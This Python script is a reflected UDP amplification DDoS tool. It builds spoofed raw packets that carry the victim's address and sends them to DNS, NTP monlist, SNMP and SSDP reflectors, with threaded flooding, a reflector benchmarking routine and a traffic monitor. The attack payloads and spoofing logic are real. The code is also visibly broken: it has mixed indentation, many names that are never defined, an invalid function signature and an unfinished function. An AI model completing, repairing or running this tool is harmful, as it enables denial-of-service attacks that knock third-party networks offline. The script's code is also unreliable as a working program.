#!/usr/bin/env python
import sys
import time
import socket
import struct
import threading
import os
import io
from random import randint
from optparse import OptionParser

sys.path.append(os.path.join(sys.path[0],'..','packetInjection'))
from RawInjector import IP, UDP

PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
	'dns': {},
	'ntp': {},
	'snmp': {},
	'ssdp': {} }		# Amplification factor

npackets = 0			# Number of packets sent
nbytes = 0				# Number of bytes reflected

SUFFIX = {
	0: '',
	1: 'K',
	2: 'M',
	3: 'G',
	4: 'T'}

def Calc(n, d, unit=''):
	i = 0
	r = float(n)
	while r/d>=1:
		r = r/d
		i+= 1
	return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)

def GetDomainList(domains):
	domain_list = []

	if '.TXT' in domains.upper():
		file = open(domains, 'r')
		content = file.read()
		file.close()
		content = content.replace('\r', '')
		content = content.replace(' ', '')
		content = content.split('\n')
		for domain in content:
			if domain:
				domain_list.append(domain)
	else:
		domain_list = domains.split(',')
	return domain_list

def Monitor():
	'''
		Monitor attack
	'''
	print(ATTACK)
	FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
	start = time.time()
	while True:
		try:
			current = time.time() - start
			bps = (nbytes*8)/current
			pps = npackets/current
			out = FMT.format(Calc(npackets, 1000), 
				Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
			sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
			time.sleep(1)
		except KeyboardInterrupt:
			print('\nInterrupted')
			break
		except Exception as err:
			print('\nError:', str(err))
			break
			

def AmpFactor(recvd, sent):
	return recvd/sent

def Benchmark(ddos):
	print(BENCHMARK)
	i = 0
	for proto in files.keys():
		ipsTuple = files[proto]
		for soldier in ipsTuple:
			if proto=='dns':
				for domain in ddos.domains:
					i+= 1
					recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
					if recvd/sent:
						print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
							AmpFactor(recvd, sent), domain))
					else:
						continue
			else:
				recvd, sent = ddos.GetAmpSize(proto, soldier)


		print('Total tested:', i)
		f.close()

class DDoS(object):
	def __init__(self, target, threads, domains, event):
		self.target = target
		self.threads = threads
		self.event = event
		self.domains = domains
	def stress(self):
		for i in range(self.threads):
			t = threading.Thread(target=self.__attack)
			t.start()
	def __send(self, sock, soldier, proto, payload):
		'''
			Send a Spoofed Packet
		'''
		udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
	def GetAmpSize(self, proto, soldier, domain=''):
		'''
			Get Amplification Size
		'''
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.settimeout(2)
		data = ''
		if proto in ['ntp', 'ssdp']:
			packet = PAYLOAD[proto]
			sock.sendto(packet, (soldier, PORT[proto]))
			try:
				while True:
					data+= sock.recvfrom(65535)[0]
			except socket.timeout:
				sock.close()
				return len(data), len(packet)
		if proto=='dns':
			packet = self.__GetDnsQuery(domain)
		else:
			packet = PAYLOAD[proto]
		try:
			sock.sendto(packet, (soldier, PORT[proto]))
			data, _ = sock.recvfrom(65535)
		except socket.timeout:
			data = ''
		finally:
			sock.close()
		return len(data), len(packet)
	def __GetQName(self, domain):
		'''
			QNAME A domain name represented as a sequence of labels 
			where each label consists of a length
			octet followed by that number of octets
		'''
		labels = domain.split('.')
		QName = ''
		for label in labels:
			if len(label):
				QName += struct.pack('B', len(label)) + label
		return QName
	def __GetDnsQuery(self, domain):
		id = struct.pack('H', randint(0, 65535))
		QName = self.__GetQName(domain)
		return PAYLOAD['dns'].format(id, QName)
	def __attack(self):
		global npackets
		global nbytes
		_protocolAndIPSList = protocolsAndIPSList
		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		i = 0
		while self.event.isSet():
			for proto in protocolsAndIPSList:
                for soldier in protocolsAndIPSList[proto]:
				    if soldier:
					    if proto=='dns':
						    if soldier not in amplification[proto]:
							    amplification[proto][soldier] = {}
						    for domain in self.domains:
							    if domain not in amplification[proto][soldier]:
								    size, _ = self.GetAmpSize(proto, soldier, domain)
								    if size==0:
									    break
								    elif size<len(PAYLOAD[proto]):
									    continue
								    else:
									    amplification[proto][soldier][domain] = size
							    amp = self.__GetDnsQuery(domain)
							    self.__send(sock, soldier, proto, amp)
							    npackets += 1
							    i+=1
							    nbytes += amplification[proto][soldier][domain]
					    else:
						    if soldier not in amplification[proto]:
							    size, _ = self.GetAmpSize(proto, soldier)
							    if size<len(PAYLOAD[proto]):
								    continue
							    else:
								    amplification[proto][soldier] = size
						    amp = PAYLOAD[proto]
						    npackets += 1
						    i+=1
						    nbytes += amplification[proto][soldier]
						    self.__send(sock, soldier, proto, amp)
		sock.close()

def amplificationAttack(ip : str,protocolsAndIPSList : dict,threads : int,dnsDomain = None : str):
    """Launch an amplification attack. protocolsAndIPSList mut be a dictionnary whose keys are protocols as a string and values are the ips, as a tuple"""
    dnsDomain = GetDomainList(dnsDomain)
    event = threading.Event()
    event.set()
    ddos = DDoS(socket.gethostbyname(ip))
    


def main():

	if options.ntp:
		files['ntp'] = [options.ntp]
	if options.snmp:
		files['snmp'] = [options.snmp]
	if options.ssdp:
		files['ssdp'] = [options.ssdp]
	if files:
		event = threading.Event()
		event.set()
		if 'BENCHMARK'==args[0].upper():
			ddos = DDoS(args[0], options.threads, domains, event)
			Benchmark(ddos)
		else:
			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event)
			ddos.stress()
			Monitor()
			event.clear()
	else:
		parser.print_help()
		sys.exit()

if __name__=='__main__':
	main()